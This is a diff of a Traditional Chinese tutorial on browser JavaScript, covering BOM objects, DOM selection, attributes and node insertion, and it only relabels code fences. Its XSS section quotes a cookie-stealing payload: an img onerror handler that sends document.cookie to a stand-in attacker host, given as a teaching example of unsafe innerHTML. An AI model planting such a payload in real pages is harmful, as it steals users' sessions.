@@ -89,7 +89,7 @@ DOM 是文件物件模型，它將 HTML 文件結構化為一個樹狀結構，�
 ## window 物件
 `window` 是 BOM 的根物件，代表整個瀏覽器視窗。在瀏覽器環境中，全域變數和函數都屬於 `window` 物件。
 
-```javascript
+```js
 // 以下兩種寫法效果相同
 console.log("Hello World");
 window.console.log("Hello World");
@@ -127,7 +127,7 @@ window 物件還提供了許多實用的方法。
 ## 對話框 alert、confirm、prompt
 請在瀏覽器控制台中逐一執行下述程式碼，觀察不同對話框的效果。
 
-```javascript
+```js
 // 基本提示框
 alert("這是一個提示訊息");
 
@@ -149,7 +149,7 @@ if (name) {
 ## 計時器 setTimeout、setInterval
 計時器是 JavaScript 中非常重要的功能，它允許我們在指定的時間後執行程式碼，或者重複執行某些操作。這在製作動畫、自動更新內容等場景中非常有用。
 
-```javascript
+```js
 // setTimeout - 延遲執行
 let timeoutId = setTimeout(function() {
     console.log("3 秒後執行");
@@ -182,7 +182,7 @@ let intervalId = setInterval(function() {
 ## 視窗控制 open
 視窗控制功能允許我們程式化地操作瀏覽器視窗，包括開啟新視窗、調整視窗大小等。不過需要注意的是，現代瀏覽器基於安全考量可能對這些功能有所限制。
 
-```javascript
+```js
 // 開啟新視窗
 let newWindow = window.open("https://www.google.com", "_blank", "width=500,height=400");
 
@@ -203,7 +203,7 @@ window.resizeTo(800, 600); // 現代瀏覽器可能限制此功能
 ## location 物件
 BOM 中處理 URL 和頁面導向的重要工具。它包含了當前頁面的完整 URL 資訊，並提供了豐富的方法來操作和導向頁面。無論是獲取當前頁面資訊還是進行頁面跳轉，`location` 物件都是不可或缺的。
 
-```javascript
+```js
 // 獲取當前 URL
 console.log(location.href);
 
@@ -261,7 +261,7 @@ location 物件還有一些實用的屬性。
 ## screen 物件
 `screen` 物件提供了關於用戶螢幕的詳細資訊，包括螢幕尺寸、色彩深度、像素密度等。這些資訊在響應式設計、適配不同設備和優化用戶體驗時非常重要。
 
-```javascript
+```js
 // 螢幕尺寸資訊
 console.log("螢幕寬度：" + screen.width);           // 螢幕實際寬度
 console.log("螢幕高度：" + screen.height);          // 螢幕實際高度
@@ -297,7 +297,7 @@ screen 物件還有一些實用的屬性。
 ## history 物件
 能夠程式化地控制瀏覽器的前進、後退功能。這在製作單頁應用程式（SPA）或需要自訂導航行為的網頁中非常有用。透過 `history` 物件，我們可以實現更靈活的頁面導航體驗。
 
-```javascript
+```js
 // 回到上一頁
 history.back();
 
@@ -431,7 +431,7 @@ DOM 中有多種節點類型：
 <div id="myDiv">這是一個 div</div>
 ```
 
-```javascript
+```js
 // 透過 ID 選擇元素（回傳單一元素）
 let element = document.getElementById("myDiv");
 console.log(element); // <div id="myDiv">這是一個 div</div>
@@ -462,7 +462,7 @@ console.log(element); // <div id="myDiv">這是一個 div</div>
 {% endnote %}
 
 ### getElementsByTagName
-```javascript
+```js
 // 選擇所有 p 標籤（回傳 HTMLCollection）
 let paragraphs = document.getElementsByTagName("p");
 console.log(paragraphs.length); // 2
@@ -470,7 +470,7 @@ console.log(paragraphs[0]); // 第一個 p 元素
 ```
 
 ### getElementsByClassName
-```javascript
+```js
 // 選擇所有 class 為 "text" 的元素（回傳 HTMLCollection）
 let textElements = document.getElementsByClassName("text");
 console.log(textElements.length); // 2
@@ -481,7 +481,7 @@ console.log(textElements.length); // 2
 <input type="text" name="username" value="使用者名稱">
 ```
 
-```javascript
+```js
 // 選擇所有 name 為 "username" 的元素
 let inputs = document.getElementsByName("username");
 console.log(inputs[0].value); // "使用者名稱"
@@ -490,7 +490,7 @@ console.log(inputs[0].value); // "使用者名稱"
 ### querySelector （推薦）
 除了傳統的選擇方法，現代瀏覽器還支援更強大和靈活的 `querySelector` 方法。這些方法使用 CSS 選擇器語法，讓元素選擇變得更加直觀和強大。`querySelector` 系列方法是目前推薦使用的選擇方法。
 
-```javascript
+```js
 // 選擇第一個符合條件的元素 （返回 Element 物件）
 let firstP = document.querySelector("p");
 let title = document.querySelector("#title");
@@ -520,7 +520,7 @@ let allButtons = document.querySelectorAll("button");
 | `querySelectorAll`       | NodeList             | 多個 | 靜態     | NodeList 方法       |
 
 #### Element 物件
-```javascript
+```js
 // 返回 Element 物件的方法
 const element1 = document.getElementById('myId');
 const element2 = document.querySelector('.myClass');
@@ -539,7 +539,7 @@ if (element1) {
 ```
 
 #### HTMLCollection
-```javascript
+```js
 // 返回 HTMLCollection 的方法
 const elements1 = document.getElementsByTagName('p');
 const elements2 = document.getElementsByClassName('text');
@@ -562,7 +562,7 @@ for (let i = 0; i < elements1.length; i++) {
 ```
 
 #### NodeList
-```javascript
+```js
 // 返回 NodeList 的方法
 const elements = document.querySelectorAll('p');
 
@@ -588,7 +588,7 @@ for (let i = 0; i < elements.length; i++) {
 ```
 
 #### HTMLCollection vs NodeList 差異
-```javascript
+```js
 // HTMLCollection - 動態更新範例
 const dynamicElements = document.getElementsByTagName('div');
 console.log('初始數量：', dynamicElements.length); // 假設 3 個
@@ -651,7 +651,7 @@ console.log('重新查詢後：', updatedElements.length); // 現在是 4 個
 | `document.images`  | HTMLCollection | 動態集合，會自動更新 |
 | `document.scripts` | HTMLCollection | 動態集合，會自動更新 |
 
-```javascript
+```js
 // 直接存取 document 子物件
 console.log(document.head); // head 元素
 console.log(document.body); // body 元素
@@ -698,7 +698,7 @@ console.log(document.scripts.length); // 腳本數量
 | 安全性    | 需注意 XSS 風險        | 較安全         |
 | 使用場景  | 需要 HTML 結構時       | 純文字內容時   |
 
-```javascript
+```js
 // demo > 內容操作
 // --------------------------------------------------
 let element = document.getElementById("title");
@@ -727,7 +727,7 @@ container.innerHTML += "<p>新添加的段落</p>";
 可以直接透過 JavaScript 來操作 HTML 元素的屬性。這包括讀取、修改、檢查與刪除屬性。本節也會釐清「DOM 屬性（property）」與「HTML 屬性（attribute）」的差異，並重點說明 `getAttribute()` 與 `setAttribute()` 的使用情境。
 
 #### 常用 API 與基本示例
-```javascript
+```js
 // demo > HTML 元素屬性：基本操作
 // --------------------------------------------------
 const element = document.getElementById("title");
@@ -753,7 +753,7 @@ element.removeAttribute("data-custom");
 - property：JavaScript 物件屬性，反映「當下的狀態」。型別可能是字串、數字、布林等。
 - attribute：HTML 原始標記上的字串值，通常是「初始設定」。多數但非全部 attribute 會對應到 property（稱為 reflected attribute）。
 
-```javascript
+```js
 // demo > 差異示例：input 的 value 與 checked
 // --------------------------------------------------
 const input = document.querySelector("input[type='text']");
@@ -772,7 +772,7 @@ console.log(checkbox.hasAttribute("checked")); // true（仍存在）
 console.log(checkbox.checked);                // false（當前狀態）
 ```
 
-```javascript
+```js
 // demo > href/src 類屬性：property 可能回傳「正規化後」的值
 // --------------------------------------------------
 const link = document.querySelector("a");
@@ -785,7 +785,7 @@ console.log(link.href);                  // 可能是絕對網址，如 "https:/
 - 以 `setAttribute('data-xxx', '值')` 或使用 `element.dataset.xxx = '值'`
 - `dataset` 以駝峰命名對應，例如 `data-user-id` ⇄ `dataset.userId`
 
-```javascript
+```js
 // demo > 操作 data-* 屬性
 // --------------------------------------------------
 const card = document.querySelector(".card");
@@ -809,7 +809,7 @@ console.log(card.dataset.role);            // "admin"
   - 需要取得「原始標記」字串（如 `href` 原始寫法、大小寫）
   - 大量動態組合屬性字串（例如 `setAttribute('style', cssText)`）
 
-```javascript
+```js
 // demo > class 與 style 的差別操作
 // --------------------------------------------------
 const box = document.querySelector(".box");
@@ -834,7 +834,7 @@ box.setAttribute("style", "color:#333; padding:12px;"); // 覆蓋整個 style �
 #### 常見的 classList 操作
 `classList` 提供便捷的類別管理 API，適合做狀態切換、條件套用與多類別增減。
 
-```javascript
+```js
 // demo > classList 常見操作
 // --------------------------------------------------
 const box = document.querySelector('.box');
@@ -866,7 +866,7 @@ box.classList.replace('active', 'is-active');
 #### 其他常見屬性操作
 以下整理幾組常見但容易忽略的屬性操作情境：
 
-```javascript
+```js
 // demo > 通用方法：toggleAttribute / hasAttributes / getAttributeNames
 // --------------------------------------------------
 const el = document.querySelector('#panel');
@@ -879,7 +879,7 @@ console.log(el.hasAttributes());       // 是否有任意屬性
 console.log(el.getAttributeNames());   // 取得所有屬性名稱陣列
 ```
 
-```javascript
+```js
 // demo > tabindex：屬性 vs 屬性值型別
 // --------------------------------------------------
 const card = document.querySelector('.card');
@@ -887,7 +887,7 @@ card.setAttribute('tabindex', '-1'); // attribute（字串）
 card.tabIndex = 0;                   // property（數字），可參與自然鍵盤導航
 ```
 
-```javascript
+```js
 // demo > 無障礙（ARIA）與 role
 // --------------------------------------------------
 const toggleBtn = document.querySelector('#toggle');
@@ -898,7 +898,7 @@ toggleBtn.setAttribute('aria-pressed', String(!pressed));
 toggleBtn.setAttribute('role', 'button');
 ```
 
-```javascript
+```js
 // demo > 布林屬性：hidden / disabled
 // --------------------------------------------------
 const input = document.querySelector('#name');
@@ -907,14 +907,14 @@ input.disabled = true;                 // 建議用 property 切換
 input.toggleAttribute('disabled', false);
 ```
 
-```javascript
+```js
 // demo > 連結安全性與使用者體驗
 // --------------------------------------------------
 const link = document.querySelector('a[target="_blank"]');
 link.setAttribute('rel', 'noopener noreferrer'); // 避免反向操作與安全風險
 ```
 
-```javascript
+```js
 // demo > 圖片載入與可存取性
 // --------------------------------------------------
 const img = document.querySelector('img.hero');
@@ -944,7 +944,7 @@ DOM 提供了多種方式來設定元素的 CSS 樣式，每種方法都有其�
 
 以下是表格中提到的所有方法的完整範例：
 
-```javascript
+```js
 // demo > 完整樣式操作方法對照
 // --------------------------------------------------
 let element = document.getElementById("title");
@@ -1944,7 +1944,7 @@ DOM 的插入方法分為傳統與現代兩大類。早期僅有 `appendChild`�
 ### 新增與插入
 JavaScript 能夠動態建立新的 DOM 節點，並依需求插入到網頁中任何指定的位置，讓網頁內容可以即時更新與互動。
 
-```javascript
+```js
 const card = document.createElement('div');
 card.className = 'card';
 
@@ -1969,7 +1969,7 @@ document.body.append(card);
 ### 移動與複製
 當你建立一個新的 DOM 節點時，這個節點在記憶體中只有一份。如果你嘗試將同一個節點插入到多個位置，瀏覽器會直接將它「搬移」到新的位置，而不是複製一份。因此，若要在多個地方出現相同結構，必須使用 `cloneNode()` 方法來複製節點。
 
-```javascript
+```js
 const ul = document.createElement('ul');
 
 const listItem1 = document.createElement('li');
@@ -2001,7 +2001,7 @@ document.body.append(ul.cloneNode(true));
 - 內部插入（成為子節點）：`append`（尾端）、`prepend`（開頭）
 - 外部插入（與該元素同一層）：`before`（自身之前）、`after`（自身之後）、`replaceWith`（以新節點取代自身）
 
-```javascript
+```js
 const container = document.querySelector('#news');
 
 // 內部插入
@@ -2018,7 +2018,7 @@ container.after(document.createElement('hr'));    // container 後
 
 `insertBefore` 與 `insertAdjacent` 系列方法屬於進階且精細的 DOM 操作工具，能讓你將新節點或內容插入到特定節點的精確位置（如某個子節點之前、之後或指定錨點）。這些方法在需要高度控制插入位置時非常實用，尤其適合動態產生複雜結構或進行細部調整。雖然日常開發中較常用 `append`、`prepend` 等現代方法，
 
-```javascript
+```js
 // 1) 舊式但仍實用：insertBefore(newNode, referenceNode)
 const list = document.querySelector('#list');
 const item = document.createElement('li');
@@ -2041,7 +2041,7 @@ box.insertAdjacentHTML('afterend', '<p>在 .box 之後</p>');
 - 最後再把整個容器一次性插入真實 DOM，瀏覽器只需處理一次變動，效能更好。
 
 ##### 對照範例：逐筆 append vs Fragment 一次插入
-```javascript
+```js
 const list = document.querySelector('#list');
 
 // A. 逐筆 append（每次都動到真實 DOM）
@@ -2117,7 +2117,7 @@ XSS（跨站腳本攻擊，Cross-Site Scripting）：攻擊者將惡意腳本（
   3) 頁面渲染從資料庫撈出，為了排版用 `innerHTML/insertAdjacentHTML` 插入
   4) 惡意事件屬性被瀏覽器解析並執行，攻擊者即可在該頁以使用者身分做任何事
 
-```javascript
+```js
 // 危險：直接將後端回傳的 HTML 串進列表
 const list = document.querySelector('#comments');
 const commentHtml = '<p>Nice!</p><img src=x onerror="fetch(\'https://attacker\/?c=\'+document.cookie)">';
@@ -2135,7 +2135,7 @@ list.append(item);
 ### 移除節點與清空
 在操作 DOM 時，除了插入新節點之外，「移除」與「清空」也是常見且重要的需求。例如：刪除不再需要的卡片、移除某個區塊，或是將容器內容全部清空以便重新渲染。以下將介紹現代與傳統的節點移除方法，以及安全清空內容的技巧。
 
-```javascript
+```js
 // 移除自身（現代）
 card.remove();
 
@@ -2158,7 +2158,7 @@ while (panel.firstChild) {
 這一節將介紹常用的節點遍歷方法，幫助你靈活取得父層、子層、兄弟節點，並說明如何以不同起點進行元素搜尋，讓你能更精確地操作網頁結構。
 
 #### 基礎操作
-```javascript
+```js
 const node = document.querySelector('.item.active');
 
 // 往上（父層）
@@ -2177,7 +2177,7 @@ const next = node.nextElementSibling;     // 後一個兄弟元素
 
 #### 指定起點向下搜尋
 `document.querySelector()` 會從整份文件找，而「任何元素節點」也都可以當成查找起點。例如：
-```javascript
+```js
 const section = document.querySelector('#profile');
 // 只在 section 範圍內找子孫層的 .avatar img
 const avatarImg = section.querySelector('.avatar img');
@@ -2192,7 +2192,7 @@ const items = section.querySelectorAll('li.item');
 {% endnote %}
 
 #### 範例：將項目上移/下移（與前/後兄弟交換）
-```javascript
+```js
 function moveUp(item) {
   const prev = item.previousElementSibling;
   if (prev) prev.before(item); // 把自己插到前一個前面
@@ -2292,7 +2292,7 @@ function moveDown(item) {
 ```
 <!-- endtab -->
 <!-- tab 解答-->
-```javascript
+```js
 const zone = document.getElementById("preview-block");
 let clr = zone.style.backgroundColor; //red
 
